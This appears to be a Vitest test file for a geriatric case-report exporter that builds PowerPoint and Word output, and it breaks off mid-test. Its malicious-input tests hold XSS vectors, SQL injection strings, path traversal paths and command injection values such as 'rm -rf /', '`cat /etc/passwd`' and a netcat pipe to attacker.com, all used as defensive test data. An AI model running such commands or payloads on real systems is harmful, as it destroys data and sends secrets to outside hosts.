/**
 * Tests for Exporters Module
 * Testing PowerPoint and Word document export functionality
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  PPT_CONFIG,
  DOC_CONFIG,
  MEDICAL_REFERENCES,
  sanitizeText,
  escapeHtml,
  truncateText,
  createSlideData,
  generatePPT,
  createProfessionalSlides,
  generateProfessionalPPT,
  createDocHTML,
  createDocBlob,
  exportDOC,
  triggerDownload
} from '../src/exporters.js';

describe('Exporters Module', () => {
  describe('PPT_CONFIG', () => {
    it('should have maxTextPerSlide defined', () => {
      expect(PPT_CONFIG.maxTextPerSlide).toBe(1000);
    });

    it('should have color definitions', () => {
      expect(PPT_CONFIG.colors).toHaveProperty('primary');
      expect(PPT_CONFIG.colors).toHaveProperty('accent');
      expect(PPT_CONFIG.colors).toHaveProperty('highlight');
    });

    it('should have font size definitions', () => {
      expect(PPT_CONFIG.fonts).toHaveProperty('title');
      expect(PPT_CONFIG.fonts).toHaveProperty('body');
      expect(PPT_CONFIG.fonts.title).toBeGreaterThan(PPT_CONFIG.fonts.body);
    });
  });

  describe('DOC_CONFIG', () => {
    it('should have correct MIME type', () => {
      expect(DOC_CONFIG.mimeType).toBe('application/msword');
    });

    it('should have UTF-8 BOM character', () => {
      expect(DOC_CONFIG.bom).toBe('\ufeff');
    });

    it('should have XML namespace definitions', () => {
      expect(DOC_CONFIG.xmlNamespaces).toHaveProperty('office');
      expect(DOC_CONFIG.xmlNamespaces).toHaveProperty('word');
      expect(DOC_CONFIG.xmlNamespaces).toHaveProperty('html');
    });
  });

  describe('sanitizeText', () => {
    it('should return empty string for null input', () => {
      expect(sanitizeText(null)).toBe('');
    });

    it('should return empty string for undefined input', () => {
      expect(sanitizeText(undefined)).toBe('');
    });

    it('should return empty string for non-string input', () => {
      expect(sanitizeText(123)).toBe('');
      expect(sanitizeText({})).toBe('');
    });

    it('should preserve normal text', () => {
      expect(sanitizeText('Hello World')).toBe('Hello World');
    });

    it('should preserve newlines and tabs', () => {
      const text = 'Line 1\nLine 2\tTabbed';
      expect(sanitizeText(text)).toBe('Line 1\nLine 2\tTabbed');
    });

    it('should remove control characters', () => {
      const text = 'Hello\x00World\x1FTest';
      const result = sanitizeText(text);
      expect(result).toBe('HelloWorldTest');
      expect(result).not.toContain('\x00');
      expect(result).not.toContain('\x1F');
    });

    it('should preserve Unicode characters', () => {
      const text = 'שלום עולם 你好世界';
      expect(sanitizeText(text)).toBe('שלום עולם 你好世界');
    });

    it('should preserve HTML entities', () => {
      const text = '&lt;div&gt; &amp; test';
      expect(sanitizeText(text)).toBe('&lt;div&gt; &amp; test');
    });

    it('should remove HTML tags', () => {
      const text = '<p>Hello</p> <div>World</div>';
      expect(sanitizeText(text)).toBe('Hello World');
    });

    it('should remove XML tags', () => {
      const text = '<a:t>Patient data</a:t> <w:p>Test</w:p>';
      expect(sanitizeText(text)).toBe('Patient data Test');
    });

    it('should remove nested HTML tags', () => {
      const text = '<div><p><strong>Bold text</strong></p></div>';
      expect(sanitizeText(text)).toBe('Bold text');
    });

    it('should handle mixed content with tags and control chars', () => {
      const text = '<p>Hello\x00</p> <span>World\x1F</span>';
      expect(sanitizeText(text)).toBe('Hello World');
    });

    it('should handle malformed nested HTML tags', () => {
      const text = '<script<script>alert("xss")</script>';
      const result = sanitizeText(text);
      expect(result).toBe('alert("xss")');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('</script>');
    });

    it('should handle deeply nested tags', () => {
      const text = '<div><span><b>Test</b></span></div>';
      const result = sanitizeText(text);
      expect(result).toBe('Test');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });
  });

  describe('escapeHtml', () => {
    it('should return empty string for null input', () => {
      expect(escapeHtml(null)).toBe('');
    });

    it('should return empty string for undefined input', () => {
      expect(escapeHtml(undefined)).toBe('');
    });

    it('should return empty string for non-string input', () => {
      expect(escapeHtml(123)).toBe('');
    });

    it('should escape ampersands', () => {
      expect(escapeHtml('A & B')).toBe('A &amp; B');
    });

    it('should escape less than signs', () => {
      expect(escapeHtml('5 < 10')).toBe('5 &lt; 10');
    });

    it('should escape greater than signs', () => {
      expect(escapeHtml('10 > 5')).toBe('10 &gt; 5');
    });

    it('should escape double quotes', () => {
      expect(escapeHtml('Say "Hello"')).toBe('Say &quot;Hello&quot;');
    });

    it('should escape single quotes', () => {
      expect(escapeHtml("It's")).toBe('It&#39;s');
    });

    it('should escape multiple special characters', () => {
      expect(escapeHtml('<script>alert("XSS & stuff")</script>'))
        .toBe('&lt;script&gt;alert(&quot;XSS &amp; stuff&quot;)&lt;/script&gt;');
    });

    it('should preserve normal text', () => {
      expect(escapeHtml('Hello World')).toBe('Hello World');
    });

    it('should preserve Unicode characters', () => {
      expect(escapeHtml('שלום 你好')).toBe('שלום 你好');
    });
  });

  describe('truncateText', () => {
    it('should not truncate short text', () => {
      expect(truncateText('Hello', 100)).toBe('Hello');
    });

    it('should truncate long text with ellipsis', () => {
      const result = truncateText('This is a very long text', 10);
      expect(result).toBe('This is...');
      expect(result.length).toBe(10);
    });

    it('should use custom suffix', () => {
      const result = truncateText('Long text here', 10, ' [more]');
      expect(result).toContain('[more]');
    });

    it('should handle null input', () => {
      expect(truncateText(null, 100)).toBe('');
    });

    it('should handle undefined input', () => {
      expect(truncateText(undefined, 100)).toBe('');
    });

    it('should handle text exactly at max length', () => {
      expect(truncateText('12345', 5)).toBe('12345');
    });

    it('should handle empty string', () => {
      expect(truncateText('', 100)).toBe('');
    });

    it('should handle very short max length', () => {
      const result = truncateText('Hello World', 5);
      expect(result.length).toBe(5);
    });
  });

  describe('createSlideData', () => {
    const sampleData = {
      ageSex: '85F',
      initials: 'AB',
      hpi: 'Patient presents with confusion',
      meds: 'Lisinopril 10mg, Metformin 500mg',
      aiResponse: 'Assessment and plan text here'
    };

    it('should create at least 15 slides for comprehensive presentation', () => {
      const slides = createSlideData(sampleData);
      expect(slides.length).toBeGreaterThanOrEqual(15);
    });

    it('should create title slide first', () => {
      const slides = createSlideData(sampleData);
      expect(slides[0].type).toBe('title');
    });

    it('should include patient identifier on title slide', () => {
      const slides = createSlideData(sampleData);
      const titleSlide = slides[0];
      const hasPatientId = titleSlide.elements.some(el =>
        el.text.includes('85F') || el.text.includes('AB')
      );
      expect(hasPatientId).toBe(true);
    });

    it('should create clinical context slide with HPI', () => {
      const slides = createSlideData(sampleData);
      // HPI is on slide 3 (index 2) in the new structure
      const hpiSlide = slides.find(slide => 
        slide.elements.some(el => el.text.includes('Chief Complaint') || el.text.includes('History'))
      );
      expect(hpiSlide).toBeDefined();
      expect(hpiSlide.type).toBe('content');
    });

    it('should create assessment slide', () => {
      const slides = createSlideData(sampleData);
      // Clinical Assessment is on slide 7 in the new structure
      const analysisSlide = slides.find(slide =>
        slide.elements.some(el => el.text.includes('Assessment') || el.text.includes('Analysis'))
      );
      expect(analysisSlide).toBeDefined();
    });

    it('should create overflow slide for long AI response', () => {
      const longData = {
        ...sampleData,
        aiResponse: 'A'.repeat(1500) // Longer than 700 chars (new threshold)
      };

      const slides = createSlideData(longData);
      expect(slides.length).toBe(16); // 15 base + 1 overflow
      const overflowSlide = slides.find(s => s.type === 'overflow');
      expect(overflowSlide).toBeDefined();
    });

    it('should not create overflow slide for short AI response', () => {
      const slides = createSlideData(sampleData);
      const hasOverflow = slides.some(s => s.type === 'overflow');
      expect(hasOverflow).toBe(false);
    });

    it('should truncate HPI content appropriately', () => {
      const longHpiData = {
        ...sampleData,
        hpi: 'X'.repeat(1000)
      };

      const slides = createSlideData(longHpiData);
      // Find HPI slide (slide 3, index 2)
      const hpiSlide = slides.find(slide =>
        slide.elements.some(el => el.text.includes('Chief Complaint') || el.text.includes('History'))
      );
      expect(hpiSlide).toBeDefined();
      
      // HPI content should be truncated to 600 chars in the new structure
      const hpiContent = hpiSlide.elements.find(el => el.text.length > 50);
      expect(hpiContent).toBeDefined();
      expect(hpiContent.text.length).toBeLessThanOrEqual(603); // 600 + '...'
    });

    it('should handle empty data and create base structure', () => {
      const emptyData = {};
      const slides = createSlideData(emptyData);

      // Should create 15 slides even with empty data
      expect(slides.length).toBe(15);
      // Should not throw and should have default empty values
      expect(slides[0].type).toBe('title');
    });

    it('should include proper styling properties', () => {
      const slides = createSlideData(sampleData);

      for (const slide of slides) {
        for (const element of slide.elements) {
          expect(element).toHaveProperty('x');
          expect(element).toHaveProperty('y');
          expect(element).toHaveProperty('fontSize');
        }
      }
    });
  });

  describe('generatePPT', () => {
    let mockPptxGenJS;
    let mockSlide;

    beforeEach(() => {
      mockSlide = {
        addText: vi.fn()
      };

      mockPptxGenJS = vi.fn(function() {
        this.addSlide = vi.fn().mockReturnValue(mockSlide);
        this.writeFile = vi.fn().mockResolvedValue(undefined);
      });
    });

    it('should throw error if PptxGenJS is not provided', () => {
      expect(() => generatePPT({}, null)).toThrow('PptxGenJS library is required');
    });

    it('should create presentation instance', () => {
      generatePPT({ ageSex: '85F' }, mockPptxGenJS);
      expect(mockPptxGenJS).toHaveBeenCalled();
    });

    it('should add slides to presentation', () => {
      const pres = generatePPT({ ageSex: '85F', initials: 'AB' }, mockPptxGenJS);
      expect(pres.addSlide).toHaveBeenCalled();
    });

    it('should add text elements to slides', () => {
      generatePPT({ ageSex: '85F' }, mockPptxGenJS);
      expect(mockSlide.addText).toHaveBeenCalled();
    });
  });

  describe('createDocHTML', () => {
    const sampleData = {
      ageSex: '85F',
      initials: 'AB',
      hpi: 'Confusion for 2 days',
      meds: 'Donepezil 10mg',
      aiResponse: 'Assessment: Delirium likely'
    };

    it('should create valid HTML structure', () => {
      const html = createDocHTML(sampleData);

      expect(html).toContain('<html');
      expect(html).toContain('</html>');
      expect(html).toContain('<head>');
      expect(html).toContain('<body>');
    });

    it('should include XML namespaces for Word compatibility', () => {
      const html = createDocHTML(sampleData);

      expect(html).toContain('xmlns:o=');
      expect(html).toContain('xmlns:w=');
      expect(html).toContain('urn:schemas-microsoft-com:office');
    });

    it('should include charset meta tag', () => {
      const html = createDocHTML(sampleData);
      expect(html).toContain("charset='utf-8'");
    });

    it('should include all patient data', () => {
      const html = createDocHTML(sampleData);

      expect(html).toContain('85F');
      expect(html).toContain('AB');
      expect(html).toContain('Confusion for 2 days');
      expect(html).toContain('Donepezil 10mg');
      expect(html).toContain('Delirium likely');
    });

    it('should have proper section headers', () => {
      const html = createDocHTML(sampleData);

      expect(html).toContain('Geriatric Case Report');
      expect(html).toContain('HPI');
      expect(html).toContain('Meds/Labs');
      expect(html).toContain('Analysis & Plan');
    });

    it('should sanitize text to remove control characters', () => {
      const dataWithControlChars = {
        ...sampleData,
        hpi: 'Test\x00\x1Ftext'
      };

      const html = createDocHTML(dataWithControlChars);

      expect(html).not.toContain('\x00');
      expect(html).not.toContain('\x1F');
    });

    it('should handle empty data', () => {
      const html = createDocHTML({});

      expect(html).toContain('Geriatric Case Report');
      expect(html).not.toContain('undefined');
    });

    it('should preserve whitespace in AI response', () => {
      const html = createDocHTML(sampleData);
      expect(html).toContain('white-space: pre-wrap');
    });
  });

  describe('createDocBlob', () => {
    it('should create Blob with correct type', () => {
      const blob = createDocBlob('<html></html>');
      expect(blob.type).toBe('application/msword');
    });

    it('should include UTF-8 BOM', () => {
      const blob = createDocBlob('<html></html>');
      // The blob parts should include the BOM
      expect(blob.parts[0]).toBe('\ufeff');
    });

    it('should include HTML content', () => {
      const html = '<html><body>Test</body></html>';
      const blob = createDocBlob(html);
      expect(blob.parts[1]).toBe(html);
    });
  });

  describe('exportDOC', () => {
    const sampleData = {
      ageSex: '90M',
      initials: 'CD',
      hpi: 'Falls at home',
      meds: 'Warfarin 5mg',
      aiResponse: 'Risk assessment completed'
    };

    it('should return object with blob, filename, and html', () => {
      const result = exportDOC(sampleData);

      expect(result).toHaveProperty('blob');
      expect(result).toHaveProperty('filename');
      expect(result).toHaveProperty('html');
    });

    it('should generate filename with initials', () => {
      const result = exportDOC(sampleData);
      expect(result.filename).toBe('Case_CD.doc');
    });

    it('should use custom filename when provided', () => {
      const result = exportDOC(sampleData, 'CustomName.doc');
      expect(result.filename).toBe('CustomName.doc');
    });

    it('should use default filename for missing initials', () => {
      const result = exportDOC({ ageSex: '85F' });
      expect(result.filename).toBe('Case_export.doc');
    });

    it('should create valid HTML in result', () => {
      const result = exportDOC(sampleData);
      expect(result.html).toContain('<html');
      expect(result.html).toContain('90M');
    });
  });

  describe('triggerDownload', () => {
    let mockLink;

    beforeEach(() => {
      mockLink = {
        href: '',
        download: '',
        click: vi.fn()
      };

      vi.spyOn(document, 'createElement').mockReturnValue(mockLink);
      vi.spyOn(document.body, 'appendChild').mockImplementation(() => {});
      vi.spyOn(document.body, 'removeChild').mockImplementation(() => {});
    });

    it('should create download link', () => {
      const blob = new Blob(['test']);

      triggerDownload(blob, 'test.doc');

      expect(document.createElement).toHaveBeenCalledWith('a');
    });

    it('should set correct filename', () => {
      const blob = new Blob(['test']);

      triggerDownload(blob, 'MyFile.doc');

      expect(mockLink.download).toBe('MyFile.doc');
    });

    it('should trigger click', () => {
      const blob = new Blob(['test']);

      triggerDownload(blob, 'test.doc');

      expect(mockLink.click).toHaveBeenCalled();
    });

    it('should clean up link element', () => {
      const blob = new Blob(['test']);

      triggerDownload(blob, 'test.doc');

      expect(document.body.appendChild).toHaveBeenCalled();
      expect(document.body.removeChild).toHaveBeenCalled();
    });

    it('should revoke object URL', () => {
      const blob = new Blob(['test']);

      triggerDownload(blob, 'test.doc');

      expect(URL.revokeObjectURL).toHaveBeenCalled();
    });
  });
});

describe('Unicode and Internationalization', () => {
  it('should preserve Hebrew characters in DOC export', () => {
    const data = {
      ageSex: '85F',
      hpi: 'שלום עולם - Patient presents with confusion',
      meds: 'תרופות',
      aiResponse: 'Hebrew text: בדיקה'
    };

    const result = exportDOC(data);

    expect(result.html).toContain('שלום עולם');
    expect(result.html).toContain('תרופות');
    expect(result.html).toContain('בדיקה');
  });

  it('should include UTF-8 BOM for proper encoding', () => {
    const data = { ageSex: '85F' };
    const result = exportDOC(data);

    // BOM should be in blob parts
    expect(result.blob.parts[0]).toBe('\ufeff');
  });
});

describe('Edge Cases', () => {
  it('should handle very long AI responses', () => {
    const data = {
      ageSex: '85F',
      aiResponse: 'X'.repeat(10000)
    };

    const slides = createSlideData(data);

    // Should have overflow slide (15 base slides + 1 overflow)
    expect(slides.length).toBe(16);
  });

  it('should handle special characters in filenames', () => {
    const data = {
      initials: 'A/B\\C'
    };

    const result = exportDOC(data);

    // Filename should be generated (may need sanitization in production)
    expect(result.filename).toContain('Case_');
  });

  it('should handle empty strings gracefully', () => {
    const data = {
      ageSex: '',
      initials: '',
      hpi: '',
      meds: '',
      aiResponse: ''
    };

    // Should not throw
    expect(() => createSlideData(data)).not.toThrow();
    expect(() => exportDOC(data)).not.toThrow();
  });

  describe('Professional Presentation Generator (No AI Required)', () => {
    it('should create professional slides without AI response', () => {
      const data = {
        ageSex: '85F',
        initials: 'AB',
        hpi: 'Patient with multiple comorbidities',
        meds: 'Aspirin 81mg, Metoprolol 25mg'
      };

      const slides = createProfessionalSlides(data);
      
      // Should create 16 slides
      expect(slides).toHaveLength(16);
      
      // First slide should be title
      expect(slides[0].title).toBe('Title Slide');
      expect(slides[0].background).toBe(PPT_CONFIG.colors.primary);
      
      // Last slide should be references
      expect(slides[15].title).toBe('References');
    });

    it('should include medical references in slides', () => {
      const data = {
        ageSex: '78M',
        initials: 'CD',
        hpi: 'Fall risk assessment',
        meds: 'Multiple medications'
      };

      const slides = createProfessionalSlides(data);
      
      // Check that references slide exists
      const referencesSlide = slides.find(s => s.title === 'References');
      expect(referencesSlide).toBeDefined();
      
      // Should include Beers Criteria reference
      const hasBeersRef = referencesSlide.elements.some(e => 
        e.text.includes('Beers Criteria')
      );
      expect(hasBeersRef).toBe(true);
    });

    it('should create header bars for content slides', () => {
      const data = {
        ageSex: '70F',
        initials: 'EF',
        hpi: 'CGA needed',
        meds: 'Review required'
      };

      const slides = createProfessionalSlides(data);
      
      // Most slides should have headers (except title and maybe references)
      const slidesWithHeaders = slides.filter(s => s.header);
      expect(slidesWithHeaders.length).toBeGreaterThan(10);
    });

    it('should include citations on each content slide', () => {
      const data = {
        ageSex: '82M',
        initials: 'GH',
        hpi: 'Comprehensive assessment',
        meds: 'Polypharmacy'
      };

      const slides = createProfessionalSlides(data);
      
      // Count slides with citation elements
      const slidesWithCitations = slides.filter(slide => 
        slide.elements.some(e => 
          e.text && (e.text.includes('Reference:') || e.text.includes('References:'))
        )
      );
      
      // Most slides should have citations
      expect(slidesWithCitations.length).toBeGreaterThan(8);
    });

    it('should handle minimal data', () => {
      const data = {
        ageSex: '75M',
        initials: 'XY'
      };

      // Should not throw even with minimal data
      expect(() => createProfessionalSlides(data)).not.toThrow();
      
      const slides = createProfessionalSlides(data);
      expect(slides).toHaveLength(16);
    });

    it('should include all key geriatric assessment domains', () => {
      const data = {
        ageSex: '88F',
        initials: 'IJ',
        hpi: 'Multimorbidity',
        meds: 'Complex regimen'
      };

      const slides = createProfessionalSlides(data);
      const titles = slides.map(s => s.title);
      
      // Check for key assessment domains
      expect(titles).toContain('Medication Safety');
      expect(titles).toContain('Functional Assessment');
      expect(titles).toContain('Cognitive Assessment');
      expect(titles).toContain('Frailty Assessment');
      expect(titles).toContain('Fall Prevention');
      expect(titles).toContain('Delirium Prevention');
    });

    it('should generate professional PPT with PptxGenJS', () => {
      // Create mock constructor function
      const MockPptxGenJS = vi.fn(function() {
        this.addSlide = vi.fn(() => ({
          background: {},
          addShape: vi.fn(),
          addText: vi.fn()
        }));
        this.ShapeType = { rect: 'rect' };
        this.layout = '';
        this.author = '';
        this.company = '';
        this.subject = '';
        this.title = '';
      });

      const data = {
        ageSex: '80F',
        initials: 'KL',
        hpi: 'Assessment needed',
        meds: 'Medication review'
      };

      const result = generateProfessionalPPT(data, MockPptxGenJS);
      
      // Should have instantiated PptxGenJS
      expect(MockPptxGenJS).toHaveBeenCalledTimes(1);
      
      // Should return pres object
      expect(result).toBeDefined();
      expect(result.layout).toBe('LAYOUT_WIDE');
      expect(result.author).toBe('SZMC Geriatrics Pro');
      
      // Should have called addSlide 16 times (16 slides)
      expect(result.addSlide).toHaveBeenCalledTimes(16);
    });

    it('should throw error if PptxGenJS not provided', () => {
      const data = { ageSex: '70M', initials: 'MN' };

      expect(() => generateProfessionalPPT(data, null)).toThrow('PptxGenJS library is required');
    });
  });

  describe('ENHANCED STRESS TESTS - Data Volume & Performance', () => {
    it('should handle extremely large AI responses (100K characters)', () => {
      const data = {
        ageSex: '85F',
        initials: 'XL',
        aiResponse: 'A'.repeat(100000) // 100KB of text
      };

      const slides = createSlideData(data);

      // Should create base slides + multiple overflow slides
      expect(slides.length).toBeGreaterThan(15);
      const overflowSlides = slides.filter(s => s.type === 'overflow');
      expect(overflowSlides.length).toBeGreaterThan(0);
    });

    it('should handle extremely large HPI (50K characters)', () => {
      const data = {
        ageSex: '90M',
        hpi: 'B'.repeat(50000) // 50KB HPI
      };

      // Should not throw, should truncate appropriately
      expect(() => createSlideData(data)).not.toThrow();
      const slides = createSlideData(data);
      expect(slides).toBeDefined();
      expect(slides.length).toBeGreaterThanOrEqual(15);
    });

    it('should handle extremely large medication list (20K characters)', () => {
      const data = {
        ageSex: '78F',
        meds: 'Aspirin 81mg, '.repeat(1000) + 'Metformin 500mg' // ~20KB
      };

      expect(() => createSlideData(data)).not.toThrow();
      expect(() => exportDOC(data)).not.toThrow();
    });

    it('should handle all fields at maximum size simultaneously', () => {
      const data = {
        ageSex: '101F',
        initials: 'ST',
        hpi: 'C'.repeat(50000),
        meds: 'D'.repeat(20000),
        aiResponse: 'E'.repeat(100000)
      };

      const startTime = Date.now();
      const slides = createSlideData(data);
      const duration = Date.now() - startTime;

      expect(slides).toBeDefined();
      expect(slides.length).toBeGreaterThan(15);
      // Performance check: should complete within reasonable time
      expect(duration).toBeLessThan(5000); // 5 seconds max
    });

    it('should handle multiple overflow slides (500K character response)', () => {
      const data = {
        ageSex: '85F',
        aiResponse: 'X'.repeat(500000) // 500KB
      };

      const slides = createSlideData(data);
      const overflowSlides = slides.filter(s => s.type === 'overflow');

      // With 700 char threshold, should create many overflow slides
      expect(overflowSlides.length).toBeGreaterThan(50);
      expect(slides.length).toBeGreaterThan(65); // 15 base + many overflow
    });

    it('should handle sanitization of massive text with control characters', () => {
      const controlChars = '\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0B\x0C\x0E\x0F';
      const largeText = ('Text' + controlChars).repeat(5000); // ~100KB with control chars

      const sanitized = sanitizeText(largeText);

      expect(sanitized).toBeDefined();
      expect(sanitized.length).toBeGreaterThan(0);
      // Should remove all control characters
      expect(sanitized).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F]/);
    });

    it('should handle massive HTML escaping (100K characters)', () => {
      const htmlText = '<script>alert("xss")</script>&lt;&gt;&quot;'.repeat(2000);

      const escaped = escapeHtml(htmlText);

      expect(escaped).toBeDefined();
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&quot;');
    });

    it('should handle truncation of extremely long text efficiently', () => {
      const veryLongText = 'A'.repeat(1000000); // 1MB

      const startTime = Date.now();
      const truncated = truncateText(veryLongText, 1000);
      const duration = Date.now() - startTime;

      expect(truncated.length).toBe(1000);
      expect(truncated).toContain('...');
      expect(duration).toBeLessThan(100); // Should be very fast
    });
  });

  describe('ENHANCED STRESS TESTS - Unicode & International', () => {
    it('should handle mixed RTL and LTR text (Hebrew, Arabic, English)', () => {
      const data = {
        ageSex: '75F',
        hpi: 'Patient שלום with مرحبا symptoms and English text',
        meds: 'תרופות: Aspirin دواء 81mg',
        aiResponse: 'Mixed text: שלום עולם مرحبا بك Hello World'
      };

      const html = createDocHTML(data);
      expect(html).toContain('שלום');
      expect(html).toContain('مرحبا');
      expect(html).toContain('Hello');

      const slides = createSlideData(data);
      expect(slides).toBeDefined();
    });

    it('should handle emoji and special Unicode characters', () => {
      const data = {
        ageSex: '80M',
        hpi: 'Patient 😊 presents with pain 🤕 and fever 🤒',
        meds: 'Medicine ♥️ 💊 tablets',
        aiResponse: 'Assessment ✓ completed ✗ incomplete'
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toContain('😊');
      expect(sanitized).toContain('🤕');

      const html = createDocHTML(data);
      expect(html).toContain('💊');
    });

    it('should handle Chinese, Japanese, Korean characters', () => {
      const data = {
        ageSex: '85F',
        hpi: '患者 (Chinese) 患者 (Japanese: かんじゃ) 환자 (Korean)',
        meds: '薬 medicine 약',
        aiResponse: '診断: Diagnosis 진단'
      };

      const html = createDocHTML(data);
      expect(html).toContain('患者');
      expect(html).toContain('かんじゃ');
      expect(html).toContain('환자');

      const sanitized = sanitizeText(data.meds);
      expect(sanitized).toContain('薬');
      expect(sanitized).toContain('약');
    });

    it('should handle combining diacritical marks', () => {
      const data = {
        ageSex: '70F',
        hpi: 'Café, naïve, résumé, Zürich, São Paulo',
        meds: 'Paracétamol, Ibuprofen™'
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toContain('Café');
      expect(sanitized).toContain('naïve');
      expect(sanitized).toContain('Zürich');
      expect(sanitized).toContain('São');
    });

    it('should handle zero-width characters and invisible Unicode', () => {
      const data = {
        ageSex: '85F',
        hpi: 'Text\u200B\u200C\u200D\uFEFFwith invisible chars'
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toBeDefined();
      // Zero-width chars may or may not be preserved, but should not break
      expect(() => createDocHTML(data)).not.toThrow();
    });
  });

  describe('ENHANCED STRESS TESTS - Boundary Conditions', () => {
    it('should handle text exactly at maxTextPerSlide (1000 chars)', () => {
      const data = {
        ageSex: '85F',
        aiResponse: 'A'.repeat(1000) // Exactly 1000
      };

      const slides = createSlideData(data);
      expect(slides).toBeDefined();
      // Should not create overflow for exactly 1000 chars
      const overflowSlides = slides.filter(s => s.type === 'overflow');
      expect(overflowSlides.length).toBe(0);
    });

    it('should handle text at maxTextPerSlide + 1 (1001 chars)', () => {
      const data = {
        ageSex: '85F',
        aiResponse: 'A'.repeat(1001) // Just over limit
      };

      const slides = createSlideData(data);
      const overflowSlides = slides.filter(s => s.type === 'overflow');
      expect(overflowSlides.length).toBeGreaterThan(0);
    });

    it('should handle single character in each field', () => {
      const data = {
        ageSex: 'F',
        initials: 'A',
        hpi: 'X',
        meds: 'Y',
        aiResponse: 'Z'
      };

      expect(() => createSlideData(data)).not.toThrow();
      expect(() => exportDOC(data)).not.toThrow();
    });

    it('should handle maximum initials length', () => {
      const data = {
        initials: 'ABCDEFGHIJ' // 10 characters
      };

      const result = exportDOC(data);
      expect(result.filename).toContain('ABCDEFGHIJ');
    });

    it('should handle age boundary conditions', () => {
      const testCases = ['0F', '1M', '99F', '100M', '150F', '999M'];

      testCases.forEach(ageSex => {
        const data = { ageSex };
        expect(() => createSlideData(data)).not.toThrow();
        expect(() => exportDOC(data)).not.toThrow();
      });
    });

    it('should handle null vs undefined vs empty string consistently', () => {
      const testCases = [
        { ageSex: null },
        { ageSex: undefined },
        { ageSex: '' },
        { hpi: null },
        { hpi: undefined },
        { hpi: '' }
      ];

      testCases.forEach(data => {
        expect(() => createSlideData(data)).not.toThrow();
        expect(() => exportDOC(data)).not.toThrow();
      });
    });
  });

  describe('ENHANCED STRESS TESTS - Malicious Input & XSS', () => {
    it('should handle deeply nested HTML tags (100 levels)', () => {
      let nestedHTML = 'content';
      for (let i = 0; i < 100; i++) {
        nestedHTML = `<div>${nestedHTML}</div>`;
      }

      const data = {
        ageSex: '85F',
        hpi: nestedHTML
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toBe('content');
      expect(sanitized).not.toContain('<div>');
    });

    it('should handle multiple XSS attack vectors', () => {
      const xssVectors = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<a href="javascript:alert(1)">click</a>',
        '<form action="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>'
      ];

      xssVectors.forEach(xss => {
        const sanitized = sanitizeText(xss);
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<img');
        expect(sanitized).not.toContain('<svg');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<object');
        expect(sanitized).not.toContain('<embed');

        const escaped = escapeHtml(xss);
        expect(escaped).toContain('&lt;');
        expect(escaped).toContain('&gt;');
      });
    });

    it('should handle SQL injection-like strings', () => {
      const data = {
        ageSex: "85F'; DROP TABLE patients; --",
        hpi: "' OR '1'='1",
        meds: "admin'--",
        aiResponse: "1'; DELETE FROM records WHERE '1'='1"
      };

      // Should not throw, should escape/sanitize properly
      expect(() => createDocHTML(data)).not.toThrow();
      expect(() => createSlideData(data)).not.toThrow();

      const html = createDocHTML(data);
      const escaped = escapeHtml(data.ageSex);
      expect(escaped).toContain('&#39;');
    });

    it('should handle command injection attempts', () => {
      const data = {
        ageSex: '85F; rm -rf /',
        hpi: '$(whoami)',
        meds: '`cat /etc/passwd`',
        aiResponse: '| nc attacker.com 1234'
      };

      expect(() => createDocHTML(data)).not.toThrow();
      expect(() => createSlideData(data)).not.toThrow();

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toBeDefined();
    });

    it('should handle path traversal attempts', () => {
      const data = {
        initials: '../../../etc/passwd',
        hpi: '..\\..\\..\\windows\\system32',
        meds: '/etc/shadow'
      };

      expect(() => exportDOC(data)).not.toThrow();
      const result = exportDOC(data);
      expect(result.filename).toBeDefined();
    });
  });

  describe('ENHANCED STRESS TESTS - Special Characters & Encoding', () => {
    it('should handle all control characters (0x00-0x1F)', () => {
      const controlChars = Array.from({ length: 32 }, (_, i) => String.fromCharCode(i)).join('');
      const data = {
        ageSex: '85F',
        hpi: 'Text' + controlChars + 'More text'
      };

      const sanitized = sanitizeText(data.hpi);
      // Should remove control chars except \n and \t
      expect(sanitized).not.toMatch(/[\x00-\x08\x0B\x0C\x0E-\x1F]/);
      expect(sanitized).toContain('Text');
      expect(sanitized).toContain('More text');
    });

    it('should handle all HTML special characters', () => {
      const data = {
        ageSex: '85F',
        hpi: '< > & " \' / = ` ~ ! @ # $ % ^ * ( ) [ ] { } | \\ ; : , . ? + -'
      };

      const escaped = escapeHtml(data.hpi);
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&amp;');
      expect(escaped).toContain('&quot;');
      expect(escaped).toContain('&#39;');
    });

    it('should handle repeated escape sequences', () => {
      const data = {
        hpi: '&amp;&amp;&amp;&lt;&lt;&lt;&gt;&gt;&gt;'.repeat(100)
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toBeDefined();
      expect(sanitized.length).toBeGreaterThan(0);
    });

    it('should handle mixed newline types (CR, LF, CRLF)', () => {
      const data = {
        hpi: 'Line1\nLine2\rLine3\r\nLine4',
        meds: 'Med1\nMed2\rMed3\r\nMed4'
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toContain('Line1');
      expect(sanitized).toContain('Line4');

      const html = createDocHTML(data);
      expect(html).toBeDefined();
    });

    it('should handle excessive whitespace variations', () => {
      const data = {
        hpi: '  Multiple   spaces\t\ttabs\n\n\nnewlines      everywhere  ',
        meds: '\t\t\tTabs\n\n\n\nNewlines    Spaces'
      };

      const sanitized = sanitizeText(data.hpi);
      expect(sanitized).toBeDefined();
      expect(sanitized).toContain('Multiple');
    });
  });

  describe('ENHANCED STRESS TESTS - Performance & Memory', () => {
    it('should handle rapid successive exports (100 iterations)', () => {
